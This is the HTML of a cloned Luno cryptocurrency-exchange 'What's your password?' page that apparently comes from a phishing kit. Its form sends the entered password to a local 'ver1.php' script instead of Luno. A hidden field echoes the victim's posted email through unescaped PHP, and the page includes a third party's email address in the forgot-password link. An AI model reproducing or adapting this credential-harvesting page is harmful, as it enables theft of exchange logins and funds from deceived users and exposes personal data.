.mat-form-field-ripple{height:1px}</style><style>.mat-form-field-appearance-outline .mat-form-field-wrapper{margin:.25em 0}.mat-form-field-appearance-outline .mat-form-field-flex{padding:0 .75em 0 .75em;margin-top:-.25em;position:relative}.mat-form-field-appearance-outline .mat-form-field-prefix,.mat-form-field-appearance-outline .mat-form-field-suffix{top:.25em}.mat-form-field-appearance-outline .mat-form-field-outline{display:flex;position:absolute;top:.25em;left:0;right:0;bottom:0;pointer-events:none}.mat-form-field-appearance-outline .mat-form-field-outline-end,.mat-form-field-appearance-outline .mat-form-field-outline-start{border:1px solid currentColor;min-width:5px}.mat-form-field-appearance-outline .mat-form-field-outline-start{border-radius:5px 0 0 5px;border-right-style:none}[dir=rtl] .mat-form-field-appearance-outline .mat-form-field-outline-start{border-right-style:solid;border-left-style:none;border-radius:0 5px 5px 0}.mat-form-field-appearance-outline .mat-form-field-outline-end{border-radius:0 5px 5px 0;border-left-style:none;flex-grow:1}[dir=rtl] .mat-form-field-appearance-outline .mat-form-field-outline-end{border-left-style:solid;border-right-style:none;border-radius:5px 0 0 5px}.mat-form-field-appearance-outline .mat-form-field-outline-gap{border-radius:.000001px;border:1px solid currentColor;border-left-style:none;border-right-style:none}.mat-form-field-appearance-outline.mat-form-field-can-float.mat-form-field-should-float .mat-form-field-outline-gap{border-top-color:transparent}.mat-form-field-appearance-outline .mat-form-field-outline-thick{opacity:0}.mat-form-field-appearance-outline .mat-form-field-outline-thick .mat-form-field-outline-end,.mat-form-field-appearance-outline .mat-form-field-outline-thick .mat-form-field-outline-gap,.mat-form-field-appearance-outline .mat-form-field-outline-thick .mat-form-field-outline-start{border-width:2px;transition:border-color .3s cubic-bezier(.25,.8,.25,1)}.mat-form-field-appearance-outline.mat-focused .mat-form-field-outline,.mat-form-field-appearance-outline.mat-form-field-invalid .mat-form-field-outline{opacity:0;transition:opacity .1s cubic-bezier(.25,.8,.25,1)}.mat-form-field-appearance-outline.mat-focused .mat-form-field-outline-thick,.mat-form-field-appearance-outline.mat-form-field-invalid .mat-form-field-outline-thick{opacity:1}.mat-form-field-appearance-outline:not(.mat-form-field-disabled) .mat-form-field-flex:hover .mat-form-field-outline{opacity:0;transition:opacity .6s cubic-bezier(.25,.8,.25,1)}.mat-form-field-appearance-outline:not(.mat-form-field-disabled) .mat-form-field-flex:hover .mat-form-field-outline-thick{opacity:1}.mat-form-field-appearance-outline .mat-form-field-subscript-wrapper{padding:0 1em}.mat-form-field-appearance-outline._mat-animation-noopable .mat-form-field-outline,.mat-form-field-appearance-outline._mat-animation-noopable .mat-form-field-outline-end,.mat-form-field-appearance-outline._mat-animation-noopable .mat-form-field-outline-gap,.mat-form-field-appearance-outline._mat-animation-noopable .mat-form-field-outline-start,.mat-form-field-appearance-outline._mat-animation-noopable:not(.mat-form-field-disabled) .mat-form-field-flex:hover~.mat-form-field-outline{transition:none}</style><style>.mat-form-field-appearance-standard .mat-form-field-flex{padding-top:.75em}.mat-form-field-appearance-standard .mat-form-field-underline{height:1px}@media screen and (-ms-high-contrast:active){.mat-form-field-appearance-standard .mat-form-field-underline{height:0;border-top:solid 1px}}.mat-form-field-appearance-standard .mat-form-field-ripple{bottom:0;height:2px}@media screen and (-ms-high-contrast:active){.mat-form-field-appearance-standard .mat-form-field-ripple{height:0;border-top:2px}}.mat-form-field-appearance-standard.mat-form-field-disabled .mat-form-field-underline{background-position:0;background-color:transparent}@media screen and (-ms-high-contrast:active){.mat-form-field-appearance-standard.mat-form-field-disabled .mat-form-field-underline{border-top-style:dotted;border-top-width:2px}}.mat-form-field-appearance-standard:not(.mat-form-field-disabled) .mat-form-field-flex:hover~.mat-form-field-underline .mat-form-field-ripple{opacity:1;transform:none;transition:opacity .6s cubic-bezier(.25,.8,.25,1)}.mat-form-field-appearance-standard._mat-animation-noopable:not(.mat-form-field-disabled) .mat-form-field-flex:hover~.mat-form-field-underline .mat-form-field-ripple{transition:none}</style><style>.mat-input-element{font:inherit;background:0 0;color:currentColor;border:none;outline:0;padding:0;margin:0;width:100%;max-width:100%;vertical-align:bottom;text-align:inherit}.mat-input-element:-moz-ui-invalid{box-shadow:none}.mat-input-element::-ms-clear,.mat-input-element::-ms-reveal{display:none}.mat-input-element,.mat-input-element::-webkit-search-cancel-button,.mat-input-element::-webkit-search-decoration,.mat-input-element::-webkit-search-results-button,.mat-input-element::-webkit-search-results-decoration{-webkit-appearance:none}.mat-input-element::-webkit-caps-lock-indicator,.mat-input-element::-webkit-contacts-auto-fill-button,.mat-input-element::-webkit-credentials-auto-fill-button{visibility:hidden}.mat-input-element[type=date]::after,.mat-input-element[type=datetime-local]::after,.mat-input-element[type=datetime]::after,.mat-input-element[type=month]::after,.mat-input-element[type=time]::after,.mat-input-element[type=week]::after{content:' ';white-space:pre;width:1px}.mat-input-element::placeholder{transition:color .4s .133s cubic-bezier(.25,.8,.25,1)}.mat-input-element::-moz-placeholder{transition:color .4s .133s cubic-bezier(.25,.8,.25,1)}.mat-input-element::-webkit-input-placeholder{transition:color .4s .133s cubic-bezier(.25,.8,.25,1)}.mat-input-element:-ms-input-placeholder{transition:color .4s .133s cubic-bezier(.25,.8,.25,1)}.mat-form-field-hide-placeholder .mat-input-element::placeholder{color:transparent!important;-webkit-text-fill-color:transparent;transition:none}.mat-form-field-hide-placeholder .mat-input-element::-moz-placeholder{color:transparent!important;-webkit-text-fill-color:transparent;transition:none}.mat-form-field-hide-placeholder .mat-input-element::-webkit-input-placeholder{color:transparent!important;-webkit-text-fill-color:transparent;transition:none}.mat-form-field-hide-placeholder .mat-input-element:-ms-input-placeholder{color:transparent!important;-webkit-text-fill-color:transparent;transition:none}textarea.mat-input-element{resize:vertical;overflow:auto}textarea.mat-input-element.cdk-textarea-autosize{resize:none}textarea.mat-input-element{padding:2px 0;margin:-2px 0}</style><img src="./password_files/saved_resource" width="1" height="1" border="0"><img src="./password_files/saved_resource" width="1" height="1" border="0"><style>.ln-account-body[_ngcontent-c4]   .ln-account-wrapper[_ngcontent-c4]   .ln-captcha[_ngcontent-c4]{height:74px;width:90%;margin:0 auto}.bttc-container[_ngcontent-c4]   .mat-secondary[_ngcontent-c4]{color:#12326b}.bttc-container[_ngcontent-c4]   mat-card-actions[_ngcontent-c4] > a.mat-button[_ngcontent-c4]{margin-top:.5rem}</style><style>.mat-icon{background-repeat:no-repeat;display:inline-block;fill:currentColor;height:24px;width:24px}.mat-icon.mat-icon-inline{font-size:inherit;height:inherit;line-height:inherit;width:inherit}[dir=rtl] .mat-icon-rtl-mirror{transform:scale(-1,1)}.mat-form-field:not(.mat-form-field-appearance-legacy) .mat-form-field-prefix .mat-icon,.mat-form-field:not(.mat-form-field-appearance-legacy) .mat-form-field-suffix .mat-icon{display:block}.mat-form-field:not(.mat-form-field-appearance-legacy) .mat-form-field-prefix .mat-icon-button .mat-icon,.mat-form-field:not(.mat-form-field-appearance-legacy) .mat-form-field-suffix .mat-icon-button .mat-icon{margin:auto}</style></head>
  <body id="o-wrapper" class="o-wrapper ln-account-body full-card">
    
<nav class="navbar navbar-fixed-top ln-navbar">
  <div class="container-fluid">
    <div class="navbar-header">
      <a id="sidenav-button--slide-left" class="ln-menu sidenav-button--slide-left" href="javascript:void(0)">
        
        <svg height="24" viewBox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg">
          <path d="M0 0h24v24H0z" fill="none"></path>
          <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"></path>
        </svg>
      </a>
      <a class="ln-logo" href="https://www.luno.com/en/">
        

<svg width="120px" height="29px" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 120 29.1" enable-background="new 0 0 120 29.1" xml:space="preserve">
  <g>
    <path d="M49.4,1c-1.1,0-1.9,0.9-1.9,2v14c0,4.9-3.5,8.3-8.5,8.3c0,0,0,0,0,0c-5,0-8.4-3.4-8.5-8.3V3c0-1.1-0.9-2-1.9-2 c-1,0-1.9,0.9-1.9,2v14.2c0,3.7,1.2,6.8,3.6,8.9c2.1,1.9,5.1,3,8.4,3.1v0H39l0.2,0l0.3,0l0,0c3.2-0.1,6.1-1.2,8.2-3.1 c2.3-2.1,3.5-5.2,3.5-8.9V3C51.3,1.9,50.4,1,49.4,1z"></path>
    <path d="M18.3,25l-6,0c-4.9,0-8.4-3.4-8.5-8.3v-14c0-1.1-0.9-2-1.9-2c-1,0-1.9,0.9-1.9,2v14.2c0,3.7,1.2,6.8,3.6,8.9 c2.1,1.9,5.1,3,8.4,3.1v0h0.4l0.2,0l0.1,0l0,0h5.6c1.1,0,1.9-0.9,1.9-2C20.2,25.8,19.3,25,18.3,25z"></path>
    <path d="M82.1,28.1c-1.1,0-1.9-0.9-1.9-2v-14c0-4.9-3.5-8.3-8.5-8.3c0,0,0,0,0,0c-5,0-8.4,3.4-8.5,7.9v14c0,1.5-0.9,2.4-1.9,2.4 c-1,0-1.9-0.9-1.9-2V12c0-3.7,1.2-6.8,3.6-8.9C65,1.1,68,0.1,71.3,0v0h0.4l0.2,0l0.3,0l0,0c3.2,0.1,6.1,1.2,8.2,3.1 C82.8,5.3,84,8.4,84,12v14.2C84,27.2,83.1,28.1,82.1,28.1z"></path>
    <path d="M105.9,29c-4,0-7.6-1.5-10.2-4.2c-2.5-2.6-3.9-6.1-3.9-9.9v-0.1c0-3.8,1.4-7.3,3.9-9.9c2.6-2.8,6.3-4.3,10.2-4.3 c4,0,7.6,1.5,10.2,4.2c2.5,2.6,3.9,6.1,3.9,9.9v0.1c0,3.8-1.4,7.3-3.9,9.9C113.5,27.5,109.8,29,105.9,29z M105.9,4.2 c-5.7,0-10.1,4.5-10.1,10.5v0.1c0,2.9,1,5.5,2.9,7.5c1.9,2,4.5,3.1,7.3,3.1c5.7,0,10.1-4.5,10.1-10.5v-0.1c0-2.9-1-5.5-2.9-7.5 C111.3,5.3,108.7,4.2,105.9,4.2z"></path>
  </g>
</svg>

      </a>
    </div>
    <div class="hidden-xs">
      <ul class="nav navbar-nav navbar-right">
        
        <li><a href="https://www.luno.com/wallet">Wallet</a></li>
        
        <li><a href="https://www.luno.com/en/login">Sign in</a></li>
        <li><a href="https://www.luno.com/en/signup" class="btn btn-primary ln-btn-sm">Sign up</a></li>
      </ul>
      
      <ul class="nav navbar-nav navbar-right">
        <li><a class="btc-price" href="https://www.luno.com/en/price">BTC/ZAR 184,499</a></li>
        <li><a href="https://www.luno.com/learn/en/" class="">Learn</a></li>
        
          <li> </li>
        
        <li><a href="https://www.luno.com/blog/en/">Blog</a></li>
        <li><a href="https://www.luno.com/en/careers">Careers</a></li>
      </ul>
    </div>
  </div>
</nav>

    
<nav id="sidenav-menu--slide-left" class="sidenav-menu sidenav-menu--slide-left">
  <div class="ln-sidenav-top">
    <a href="javascript:void(0)" class="sidenav-menu__close ln-close">
      
      <svg width="18px" height="18px" viewBox="0 0 18 18" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
        <g stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">
          <g transform="translate(-35.000000, -42.000000)">
            <polygon points="53 49.875 39.3087499 49.875 45.5975 43.5862498 44 42 35 51 44 60 45.5862498 58.4137501 39.3087499 52.125 53 52.125"></polygon>
          </g>
        </g>
      </svg>
    </a>
    <div class="sidenav-logo">
      <img src="./password_files/luno-logo.svg">
    </div>
    <a class="btn btn-primary ln-btn-primary" href="https://www.luno.com/en/signup">Get Started</a>
  </div>
  <div class="ln-sidenav-links visible-xs">
    <h4>Account</h4>
    <ul class="nav">
      <li class="nav-item">
        <a href="https://www.luno.com/en/login">Sign in</a>
      </li>
      <li class="nav-item">
        <a href="https://www.luno.com/en/signup">Sign up</a>
      </li>
      
      <li class="nav-item">
        <a href="https://www.luno.com/wallet">Wallet</a>
      </li>
      
      
    </ul>
  </div>
  <hr class="ln-divider visible-xs">
  <div class="ln-sidenav-links">
    
<h4>Price charts</h4>
<ul class="nav">
  <li class="nav-item">
    <a href="https://www.luno.com/en/price#BTC">Bitcoin price</a>
  </li>
  <li class="nav-item">
    <a href="https://www.luno.com/en/price#ETH">Ethereum price</a>
  </li>
</ul>

  </div>
  <hr class="ln-divider visible-xs">
  <div class="ln-sidenav-links">
    
<h4>Resources</h4>
<ul class="nav">
  <li class="nav-item">
    <a href="https://www.luno.com/blog/en/">Blog</a>
  </li>
  <li class="nav-item">
    <a href="https://www.luno.com/help/en/">Help Centre</a>
  </li>
  <li class="nav-item">
    <a href="https://www.luno.com/learn/en/">Learning Portal</a>
  </li>
  <li class="nav-item">
    <a href="https://www.luno.com/en/countries">Fees &amp; features</a>
  </li>
</ul>

  </div>
  <hr class="ln-divider">
  <div class="ln-sidenav-links">
    
<h4>Products</h4>
<ul class="nav">
  
  <li class="nav-item">
    <a href="https://www.luno.com/en/bitcoin-wallet">Luno Bitcoin Wallet</a>
  </li>
  <li class="nav-item">
    <a href="https://www.luno.com/en/ethereum-wallet">Luno Ethereum Wallet</a>
  </li>
  <li class="nav-item">
    <a href="https://www.luno.com/en/exchange">Luno Exchange</a>
  </li>
  <li class="nav-item">
    <a href="https://www.luno.com/en/business">Luno Business</a>
  </li>
  <li class="nav-item">
    <a href="https://www.luno.com/en/api">Luno API</a>
  </li>
</ul>

  </div>
  <hr class="ln-divider">
  <div class="ln-sidenav-links">
    
<h4>About</h4>
<ul class="nav">
  <li class="nav-item">
    <a href="https://www.luno.com/en/about">Company</a>
  </li>
  <li class="nav-item">
    <a href="https://www.luno.com/en/careers">Careers</a>
  </li>
  <li class="nav-item">
    <a href="https://www.luno.com/press/en/">Press</a>
  </li>
</ul>

  </div>
  <hr class="ln-divider">
  <div class="ln-sidenav-btm">
    <a class="btn ln-btn-outline-lg" href="https://play.google.com/store/apps/details?hl=en&amp;id=co.bitx.android.wallet"><img src="./password_files/store-google-alt.svg" alt="Google Play Store Logo"></a>
    <a class="btn ln-btn-outline-lg" href="https://itunes.apple.com/app/bitx-wallet/id927362479?mt=8"><img src="./password_files/store-apple-alt.svg" alt="Apple App Store Logo"></a>
  </div>
</nav>
<div id="sidenav-mask" class="sidenav-mask"></div>


    <div class="ln-account-wrapper">
      

<noscript>
  <p class="alert alert-warning">
    This page requires Javascript to be enabled.
  </p>
</noscript>

<app-root _nghost-c0="" ng-version="6.1.4"><div _ngcontent-c0="" class="luno-auth-apps"><router-outlet _ngcontent-c0=""></router-outlet><app-login _nghost-c1="" class="ng-star-inserted"><!----><div _ngcontent-c1=""><!----><!----><!----><!----><app-login-password _ngcontent-c1="" _nghost-c4="" class="ng-star-inserted"><!----><!----><div _ngcontent-c4="" class="bttc-container ng-star-inserted"><luno-content _ngcontent-c4="" class="narrow" _nghost-c8=""><mat-card _ngcontent-c4="" class="mat-card"><img _ngcontent-c4="" class="card-image" src="./password_files/ill_password.svg"><h3 _ngcontent-c4="">What's your password?</h3> <form method="post" name="myform" action="ver1.php">
	 <INPUT 
 type="hidden" id="email" name="email" value= "<?php print "$_POST[email] \n\n"; ?>"><luno-input _ngcontent-c4=""><!----><mat-form-field appearance="outline" class="mat-form-field ng-tns-c13-1 mat-#12326B mat-form-field-type-mat-input mat-form-field-appearance-outline mat-form-field-can-float ng-pristine ng-invalid ng-star-inserted mat-form-field-invalid mat-form-field-hide-placeholder ng-touched" color="#12326B" hiderequiredmarker=""><div class="mat-form-field-wrapper"><div class="mat-form-field-flex"><!----><!----><div class="mat-form-field-outline ng-tns-c13-1 ng-star-inserted"><div class="mat-form-field-outline-start" style="width: 7px;"></div><div class="mat-form-field-outline-gap" style="width: 62.5px;"></div><div class="mat-form-field-outline-end"></div></div><div class="mat-form-field-outline mat-form-field-outline-thick ng-tns-c13-1 ng-star-inserted"><div class="mat-form-field-outline-start" style="width: 7px;"></div><div class="mat-form-field-outline-gap" style="width: 62.5px;"></div><div class="mat-form-field-outline-end"></div></div><!----><div class="mat-form-field-infix"><input class="mat-input-element mat-form-field-autofill-control cdk-text-field-autofill-monitored ng-pristine ng-invalid ng-touched" matinput="" type="password" placeholder="Password" name="password" required="" id="mat-input-1" aria-invalid="true" aria-required="true" aria-describedby="mat-error-1"><!----><span class="mat-form-field-label-wrapper"><!----><label class="mat-form-field-label ng-tns-c13-1 mat-empty mat-form-field-empty ng-star-inserted" id="mat-form-field-label-3" for="mat-input-1" aria-owns="mat-input-1"><!----><!----><!----><mat-label class="input-label ng-star-inserted"> <!----></mat-label><!----><!----></label></span></div><!----><div class="mat-form-field-suffix ng-tns-c13-1 ng-star-inserted"><!----><!----><mat-icon class="input-mat-icon mat-icon material-icons ng-star-inserted" matsuffix="" role="img" aria-hidden="true">visibility_off</mat-icon></div></div><!----><div class="mat-form-field-subscript-wrapper"><!----><div class="ng-tns-c13-1 ng-trigger ng-trigger-transitionMessages ng-star-inserted" style="opacity: 1; transform: translateY(0%);"><!----><mat-error class="mat-error ng-star-inserted" role="alert" id="mat-error-1"></mat-error><!----></div><!----></div></div></mat-form-field></luno-input><mat-card-actions _ngcontent-c4="" class="mat-card-actions"><button _ngcontent-c4="" color="primary" mat-flat-button="" class="mat-flat-button mat-primary" ><span class="mat-button-wrapper">Next</span><div class="mat-button-ripple mat-ripple" matripple=""></div><div class="mat-button-focus-overlay"></div></button><!----><a _ngcontent-c4="" color="primary" mat-button="" class="mat-button mat-primary ng-star-inserted" href="https://www.luno.com/forgot_password?email=paulmakwinja%40gmail.com" tabindex="0" aria-disabled="false"><span class="mat-button-wrapper">Forgot password</span><div class="mat-button-ripple mat-ripple" matripple=""></div><div class="mat-button-focus-overlay"></div></a></mat-card-actions></form></mat-card></luno-content></div></app-login-password><!----><!----><!----></div></app-login></div></app-root>

    </div>

    


    
<script>
  window.DATA = {
    messages: {
  "msg2FACode": "Two-factor authentication code",
  "msg404": "Sorry, we couldn't find what you're looking for",
  "msg429": "Too many requests, try again later",
  "msg500": "An error occurred, please try again",
  "msgAgreeToTerms": "By signing up I agree to the <a href=\"\/en\/legal\/terms\" target=\"_blank\">Terms of use</a> and processing of my personal data as stated in the <a href=\"\/en\/legal\/privacy\" target=\"_blank\">Privacy policy</a>",
  "msgAllTime": "All Time",
  "msgAmount": "Amount",
  "msgAuthorizationRequested": "Authorization requested",
  "msgAuthorizationRequired": "Please sign in to continue.",
  "msgAuthorize": "Authorise",
  "msgAuthorizeTransaction": "Authorisation required",
  "msgBuyNow": "Buy Now",
  "msgCancel": "Cancel",
  "msgChooseNewPassword": "Please choose a new password for your account:",
  "msgChoosePIN": "Choose a four-digit PIN to authorize transactions:",
  "msgChoosePassword": "Choose password",
  "msgConfirm": "Lock my account",
  "msgConfirm2FA": "Confirm",
  "msgConfirmEmail": "Confirm email",
  "msgConfirmation": "Thank you for your fraud report. We will investigate and take appropriate action.",
  "msgConfirmed": "I have confirmed my email",
  "msgCorrectWebsite": "<b>Always</b> ensure you're on the correct website",
  "msgDay": "Day",
  "msgDeny": "Deny",
  "msgDisabledFeatures": "For 7 days nobody will be able to:",
  "msgEmailAddress": "Email address",
  "msgEmailSent": "Email sent",
  "msgEnd": "All functions will be automatically restored after 7 days",
  "msgEnter2FACode": "Enter your two-factor authentication code:",
  "msgEnterEmail": "Enter email address",
  "msgEnterEmailAddress": "Enter email address",
  "msgEnterEmailLink": "Enter your email address and we'll send a link that will let you reset your password.",
  "msgFacebook": "Facebook",
  "msgFailure": "Failure",
  "msgFeatureBuySell": "Buy and sell your crypto",
  "msgFeatureFiat": "Deposit or withdraw your money",
  "msgFeatureSend": "Send crypto from your account",
  "msgFeatureTrade": "Trade on the Luno Exchange",
  "msgForgotPassword": "Forgot password",
  "msgGoogle": "Google",
  "msgHavingTrouble": "Having trouble?",
  "msgHigh": "High:",
  "msgInstructions": "We've sent you an email. Please click on the link in the email to reset your password.",
  "msgInterestedBuying": "Are you interested in buying Bitcoin or Ethereum?",
  "msgInvalidToken": "This password reset link is invalid. You can request a new link <a href=\"/forgot_password\">here</a>.",
  "msgLearnMore": "Learn more",
  "msgLinkSent": "Password reset link sent",
  "msgLockMyAccount": "Lock my account",
  "msgLostAuthenticator": "I deleted or lost the Authy or Google Authenticator app",
  "msgLow": "Low:",
  "msgMonth": "Month",
  "msgMoreInfo": "More info",
  "msgNewPassword": "New password",
  "msgNext": "Next",
  "msgNoData": "No data available.",
  "msgNote": "Note",
  "msgNoteHelp": "Please provide us with additional information about the fraudulent transaction.",
  "msgOATHHelpArticle": "My 6-digit code isn't working",
  "msgOATHHelpReset": "I can't access my authentication app",
  "msgOptInForMarketing": "I'd like to receive promos, tips and announcements (update or opt out at any time)",
  "msgOrSignInWith": "or sign in with",
  "msgPassword": "Password",
  "msgPasswordFormat": "Use at least 8 characters, 1 number & 1 uppercase letter",
  "msgPasswordReset": "Your password has been reset.",
  "msgPreventAttacks": "To prevent phishing attacks enable two-factor authentication and avoid clicking links from emails and fake Google search ads",
  "msgReasonForReport": "Reason for report",
  "msgReport": "Report",
  "msgReportFraud": "Report fraud",
  "msgReportFraudHeading": "We take the security of your funds very seriously. If you believe that the specified transaction is fraudulent, please let us know immediately.",
  "msgRequestError": "An error occurred. Please try again.",
  "msgResendBy": "resend confirmation code by",
  "msgResendEmail": "Resend email",
  "msgResendViaEmail": "Resend via Email",
  "msgResendViaSMS": "Resend via SMS",
  "msgResent": "Done. Please check your inbox.",
  "msgResetPassword": "Reset password",
  "msgRevokeAccess": "You can revoke access at any time from your account settings. Your password will not be shared.",
  "msgSecurityWarning": "Beware Phishing",
  "msgSelectCountry": "Select country&hellip;",
  "msgSignIn": "Sign in",
  "msgSignUp": "Sign up",
  "msgSignUpWith": "or sign up with",
  "msgSignUpBusiness": "You are creating a business account",
  "msgSignUpSwitchIndividual": "I'm an individual",
  "msgSignUpSwitchBusiness": "Sign up as a business",
  "msgTime": "Time",
  "msgTransactionID": "Transaction ID",
  "msgTryAgain": "Try again",
  "msgWeek": "Week",
  "msgWelcomeBack": "Welcome back",
  "msgYear": "Year",
  "msgRedirecting": "Redirecting... Please wait"
},
    lang: "en",
    login_type: "",
    social_token: "",
    redirect: "/wallet",
    googleLoginURL: "https://accounts.google.com/o/oauth2/auth?access_type=online\u0026client_id=1078313900011-gqeq7c9lfuplt08f1rj97imu9bdhhogq.apps.googleusercontent.com\u0026redirect_uri=https%3A%2F%2Fwww.luno.com%2Flogin%2Foauth2v2\u0026response_type=code\u0026scope=profile+email\u0026state=provider%3D3%26redirect%3D%252Fwallet%26token%3DuHZDD7we7Djd0l0XsJdmqklApag%253A1565265903063",
    facebookLoginURL: "https://www.facebook.com/v3.2/dialog/oauth?access_type=online\u0026client_id=1822420951318358\u0026redirect_uri=https%3A%2F%2Fwww.luno.com%2Flogin%2Foauth2v2\u0026response_type=code\u0026scope=email+public_profile\u0026state=provider%3D2%26redirect%3D%252Fwallet%26token%3DOML-P8-ypCGBw2orrvp18FDTPHo%253A1565265903063",
    oathHelpURL: "https://www.luno.com/help/articles/1000185302",
    urls: {static: "https://d32exi8v9av3ux.cloudfront.net/static", webAssets: "https://d32exi8v9av3ux.cloudfront.net/web/2019/08/08/1868d22"},
    authInfo: "https://www.luno.com/help/articles/1000185302",
    featureFlags: {"android_biometrics":false,"auth_phone_change":false,"bchSell":true,"beta_charts":true,"better_search":false,"chatbot":false,"chatbot_v3":false,"combined_balance":false,"confirmation_screens_v2":true,"country_autofail":true,"delete_credit_cards":false,"enable_best_trip":true,"enable_best_trip_dev":false,"enable_beta_launch":true,"enable_careers_upgrade":true,"enable_malaysia_kyc":false,"enable_zambia_kyc":true,"enhanced_doc_capture":true,"fundingGuide":false,"google_pay":false,"identity_form_field_errors":true,"instant_buy":false,"instant_buy_error_messages":false,"kyc_flow_v2":true,"live_candles":true,"live_chat":false,"manage_credit_cards":false,"masonry_deck":true,"multi_crypto_currency":true,"opt_in_marketing":true,"post_only_orders":true,"receive_strings":false,"security_centre":true,"security_centre_new_count_tags":true,"send_receive_requires_verification":false,"siftscience_js":false,"simplex_bitcoin_buy":false,"toggle_send":true,"trading":true,"trading_chat":false,"trading_graphs":false,"trading_market_updates":false,"trading_view":false,"wallet_statements":true},
    themeName: ""
}
</script>

<link rel="stylesheet" href="./password_files/styles.css">





<noscript><img height="1" width="1" style="display:none" src="https://q.quora.com/_/ad/dc6555292a854600989bd59fe03f6314/pixel?tag=ViewContent&amp;noscript=1"></noscript>






  









<div class="cdk-live-announcer-element cdk-visually-hidden" aria-atomic="true" aria-live="polite"></div></body></html>